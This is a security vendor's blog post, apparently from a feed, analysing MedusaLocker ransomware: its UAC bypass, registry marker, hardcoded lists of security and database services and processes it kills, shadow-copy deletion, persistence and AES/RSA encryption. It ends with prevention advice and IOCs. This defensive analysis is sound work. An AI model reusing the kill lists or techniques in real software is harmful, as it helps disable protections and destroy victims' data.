minutes</span></span><p>Our recent research has highlighted the presence of the MedusaLocker ransomware, which first surfaced in mid-2019. Its primary targets are the Hospital and Healthcare industries. MedusaLocker employs AES and RSA encryption techniques to encrypt victims&#8217; data.</p>\n<p><strong>Technical analysis</strong></p>\n<p>At the start, it performs a check for the presence of a Mutex. If the Mutex does not exist, it proceeds to create the Mutex using the CreateMutexW() function, as shown in the below fig:</p>\n<p><img class=\"alignnone size-full wp-image-5848\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex1.png\" alt=\"\" width=\"927\" height=\"242\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex1.png 927w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex1-300x78.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex1-768x200.png 768w\" sizes=\"(max-width: 927px) 100vw, 927px\" /></p>\n<p style=\"text-align: center;\"><em>Fig: Creating the Mutex </em></p>\n<p>MedusaLocker checks to determine whether the current process runs with administrative privileges. If it detects that the process lacks admin privileges, it employs a User Account Control (UAC) bypass technique to attain elevated privileges.</p>\n<p><img class=\"alignnone size-full wp-image-5849\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex2.png\" alt=\"\" width=\"794\" height=\"296\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex2.png 794w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex2-300x112.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex2-768x286.png 768w\" sizes=\"(max-width: 794px) 100vw, 794px\" /></p>\n<p style=\"text-align: center;\">Fig: Elevating administrator privilege</p>\n<p><img class=\"alignnone size-full wp-image-5850\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex3.png\" alt=\"\" width=\"1017\" height=\"304\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex3.png 1017w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex3-300x90.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex3-768x230.png 768w\" sizes=\"(max-width: 1017px) 100vw, 1017px\" /></p>\n<p style=\"text-align: center;\">Fig: UAC bypass</p>\n<p>It adds the registry key HKEY_CURRENT_USER\\SOFTWARE\\MDSLK\\ with the name “self” and data as the application name, designating  the system being infected by MDuSaLocker.</p>\n<p><img class=\"alignnone size-full wp-image-5851\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex4.png\" alt=\"\" width=\"918\" height=\"265\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex4.png 918w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex4-300x87.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex4-768x222.png 768w\" sizes=\"(max-width: 918px) 100vw, 918px\" /></p>\n<p><img class=\"alignnone size-full wp-image-5852\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex5.png\" alt=\"\" width=\"756\" height=\"142\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex5.png 756w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex5-300x56.png 300w\" sizes=\"(max-width: 756px) 100vw, 756px\" /></p>\n<p style=\"text-align: center;\">Fig: Registry entry</p>\n<p><strong>Disables the services and terminates the processes:</strong></p>\n<p>Like other ransomware, MedusaLocker also terminates specific services by referencing a hardcoded list of services. It compares this list with the currently running services, and if any of the hardcoded services are found to be running, it stops them using the CloseServiceHandle(), as shown in the below fig<em>:</em></p>\n<p><img class=\"alignnone size-full wp-image-5853\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex6.png\" alt=\"\" width=\"983\" height=\"202\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex6.png 983w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex6-300x62.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex6-768x158.png 768w\" sizes=\"(max-width: 983px) 100vw, 983px\" /></p>\n<p style=\"text-align: center;\"><em>Fig: Disables the running service</em></p>\n<p><strong><em>List of hardcoded services:</em></strong></p>\n<p><em>wrapper, DefWatch, ccEvtMgr, ccSetMgr, SavRoam, sqlservr, sqlagent, sqladhlp, Culserver, RTVscan, sqlbrowser, SQLADHLP, QBIDPService, Intuit.QuickBooks.FCS, QBCFMonitorService, sqlwriter, msmdsrv, tomcat6, zhudongfangyu, SQLADHLP, vmware-usbarbitator64, vmware-converter, dbsrv12, dbeng8</em><em> </em></p>\n<p>Ransomware uses CreateToolhelp32Snapshot() to retrieve the running processes. It compares with a predefined list of hardcoded processes. If any of the hardcoded processes are detected as running, the ransomware proceeds to terminate those processes using the <em>TerminateProcess,</em> as shown in the below fig<em>:</em></p>\n<p><img class=\"alignnone size-full wp-image-5854\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex7.png\" alt=\"\" width=\"947\" height=\"158\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex7.png 947w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex7-300x50.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex7-768x128.png 768w\" sizes=\"(max-width: 947px) 100vw, 947px\" /></p>\n<p style=\"text-align: center;\"><em>Fig: Terminating the running process</em></p>\n<p><strong><em>List of hardcoded processes:</em></strong></p>\n<p><em>wxServer.exe, wxServerView, sqlservr.exe, sqlmangr.exe, RAgui.exe, supervise.exe, Culture.exe, RTVscan.exe, Defwatch.exe, sqlbrowser.exe, winword.exe, QBW32.exe, QBDBMgr.exe, qbupdate.exe, QBCFMonitorService.exe, axlbridge.exe, QBIDPService.exe, httpd.exe, fdlauncher.exe, MsDtSrvr.exe, tomcat6.exe, java.exe, 360se.exe, 360doctor.exe, wdswfsafe.exe, fdlauncher.exe, fdhost.exe, GDscan.exe, ZhuDongFangYu.exe</em><strong> </strong></p>\n<p><strong>Deleting shadow copy and disabling data recovery:</strong></p>\n<p>MedusaLocker uses hardcoded commands to remove backups, delete the shadow copy, etc.</p>\n<p><img class=\"alignnone size-full wp-image-5855\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex8.png\" alt=\"\" width=\"570\" height=\"242\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex8.png 570w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex8-300x127.png 300w\" sizes=\"(max-width: 570px) 100vw, 570px\" /></p>\n<p style=\"text-align: center;\">Fig: Hardcoded commands</p>\n<p><strong>Persistence</strong></p>\n<p>Medusa Locker ransomware duplicates its malicious executable as either &#8220;svhost.exe&#8221; or &#8220;svchostt.exe&#8221; within the user&#8217;s roaming application data directory (%AppData%\\Roaming) to establish persistence and ensure the malware runs during system start-up, allowing it to continue encrypting files.</p>\n<p><img class=\"alignnone size-full wp-image-5856\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex9.png\" alt=\"\" width=\"534\" height=\"335\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex9.png 534w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex9-300x188.png 300w\" sizes=\"(max-width: 534px) 100vw, 534px\" /></p>\n<p style=\"text-align: center;\">Fig: Persistence mechanism</p>\n<p><strong>Encryption</strong></p>\n<p>In the encryption process like other ransomware, it also excludes the list of files, folders, and hardcoded extensions from the encryption process.</p>\n<p>The ransomware uses both AES+RSA encryption keys. The ransomware employs AES 256 encryption to lock the victim&#8217;s files, creating a unique AES encryption key. This AES key is then encrypted using an embedded RSA public key, resulting in the ciphertext. The RSA encryption ensures that without the corresponding private key, decryption of the AES key is practically impossible.</p>\n<p>The AES key is essential for unlocking the victim&#8217;s files, making access contingent on obtaining the private key from the attackers.</p>\n<p><img class=\"alignnone size-full wp-image-5857\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex10.png\" alt=\"\" width=\"805\" height=\"253\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex10.png 805w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex10-300x94.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex10-768x241.png 768w\" sizes=\"(max-width: 805px) 100vw, 805px\" /></p>\n<p style=\"text-align: center;\"><em>Fig: RSA-KEY</em></p>\n<p><img class=\"alignnone size-full wp-image-5858\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex11.png\" alt=\"\" width=\"685\" height=\"157\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex11.png 685w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex11-300x69.png 300w\" sizes=\"(max-width: 685px) 100vw, 685px\" /></p>\n<p style=\"text-align: center;\"><em>Fig: Iteration of drive</em></p>\n<p>The ransomware tries to retrieve the logical drives using the API call GetLogicalDrives to encrypt the system.</p>\n<p><img class=\"alignnone size-full wp-image-5859\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex12.png\" alt=\"\" width=\"419\" height=\"184\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex12.png 419w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex12-300x132.png 300w\" sizes=\"(max-width: 419px) 100vw, 419px\" /></p>\n<p style=\"text-align: center;\"><em>Fig: Calling encryption function</em></p>\n<p>It drops the Ransom note in an HTML file which contains the personal ID, Tor link, and emails of attackers.</p>\n<p><img class=\"alignnone size-full wp-image-5860\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex13.png\" alt=\"\" width=\"1366\" height=\"768\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex13.png 1366w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex13-300x169.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex13-768x432.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex13-1024x576.png 1024w\" sizes=\"(max-width: 1366px) 100vw, 1366px\" /></p>\n<p style=\"text-align: center;\"><em>Fig: Ransom note dopped by Medusa Ransomware</em></p>\n<p><img class=\"alignnone size-full wp-image-5861\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex14.png\" alt=\"\" width=\"544\" height=\"181\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex14.png 544w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex14-300x100.png 300w\" sizes=\"(max-width: 544px) 100vw, 544px\" /></p>\n<p style=\"text-align: center;\"><em>Fig: Encrypted files with extension “L54”</em></p>\n<p><strong>Network infection</strong></p>\n<p><img class=\"alignnone size-full wp-image-5862\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex15.png\" alt=\"\" width=\"676\" height=\"382\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex15.png 676w, https://www.seqrite.com/blog/wp-content/uploads/2023/10/Mutex15-300x170.png 300w\" sizes=\"(max-width: 676px) 100vw, 676px\" /></p>\n<p style=\"text-align: center;\"> Fig: Network Enumeration</p>\n<p>After Encryption, the ransomware uses Windows Network API <em>NetShareEnum </em>to enumerate network share. It processes share names, performs string manipulations, and checks for the presence of &#8220;$&#8221; in share names.</p>\n<p>It seeks to spread to other devices on the same network, attempting to infect them like a digital contagion.</p>\n<p><strong>How do we prevent such kinds of attacks?  </strong><strong> </strong></p>\n<ul>\n<li>Do not download and open any attachments from unknown sources.</li>\n<li>Avoid clicking on any unverified link. The leading cause of ransomware attacks is clicking on untrusted links and attachments.</li>\n<li>Regularly update your operating system, applications, and software to fix known vulnerabilities, often exploited by ransomware.</li>\n<li>Back up your data so that it can be recovered in case of a ransomware attack.</li>\n</ul>\n<p><strong>Conclusion</strong></p>\n<p>Medusa Locker ransomware is a notorious strain of malicious software that encrypts victims&#8217; files, rendering them inaccessible until a ransom is paid. This dangerous malware has caused widespread damage to individuals and organizations alike. As cybercriminals continually evolve their tactics, the threat of Medusa Locker remains ever-present.</p>\n<p><strong>SEQRITE protection:</strong></p>\n<ul>\n<li>Generic Signature names:</li>\n<li>Medusa.S27286013</li>\n<li>Medusa.S13913779</li>\n<li>MedusaLock.S9836707</li>\n<li>YakbeexMSIL.ZZ4</li>\n<li>Medusa.S10272352</li>\n</ul>\n<p><strong>MITRE ATT&amp;CK TTPs:</strong></p>\n<table>\n<tbody>\n<tr>\n<td width=\"301\"><strong>Command and Scripting Interpreter</strong></td>\n<td width=\"301\"><strong>T1059</strong></td>\n</tr>\n<tr>\n<td width=\"301\"><strong>Inhibit System Recovery</strong></td>\n<td width=\"301\"><strong>T1490</strong></td>\n</tr>\n<tr>\n<td width=\"301\"><strong>File and Directory Discovery</strong></td>\n<td width=\"301\"><strong>T1083</strong></td>\n</tr>\n<tr>\n<td width=\"301\"><strong>System Information Discovery</strong></td>\n<td width=\"301\"><strong>T1082</strong></td>\n</tr>\n<tr>\n<td width=\"301\"><strong>Data Encrypted for Impact</strong></td>\n<td width=\"301\"><strong>T1486</strong></td>\n</tr>\n<tr>\n<td width=\"301\"><strong>Service Stop</strong></td>\n<td width=\"301\"><strong>T1489</strong></td>\n</tr>\n</tbody>\n</table>\n<p><strong>IOCs:</strong></p>\n<p>6da9c76a6e319c17f1d39e0ae2eaf2af</p>\n<p>4ef811b784b985769645e03bc0b9cd24</p>\n<p>61b0906f31ce772130b0ee9c4b86dc92</p>\n<p><strong>Authors:</strong></p>\n<p><span class=\"undefined lpc-hoverTarget\" tabindex=\"0\" role=\"button\" aria-label=\"Opens Profile Card for soumen.burma@quickheal.com\" data-lpc-hover-target-id=\"react-target-v2-125\" aria-haspopup=\"dialog\" data-is-focusable=\"true\"><span class=\"X0iCk\">Soumen Burma</span></span></p>\n<p><span class=\"undefined lpc-hoverTarget\" tabindex=\"0\" role=\"button\" aria-label=\"Opens Profile Card for vaibhav.billade@quickheal.com\" data-lpc-hover-target-id=\"react-target-v2-126\" aria-haspopup=\"dialog\" data-is-focusable=\"true\"><span class=\"X0iCk\">Vaibhav Krushna Billade</span></span></p>\n<p>The post <a rel=\"follow\" href=\"https://www.seqrite.com/blog/medusalocker-ransomware-an-in-depth-technical-analysis-and-prevention-strategies/\" data-wpel-link=\"internal\" target=\"_self\">MedusaLocker Ransomware: An In-Depth Technical Analysis and Prevention Strategies</a> appeared first on <a rel=\"follow\" href=\"https://www.seqrite.com/blog\" data-wpel-link=\"internal\" target=\"_self\">Blogs on Information Technology, Network &amp; Cybersecurity | Seqrite</a>.</p>\n"},"wfw:commentRss":"https://www.seqrite.com/blog/medusalocker-ransomware-an-in-depth-technical-analysis-and-prevention-strategies/feed/","slash:comments":"0","commentcount":"0"}]}}}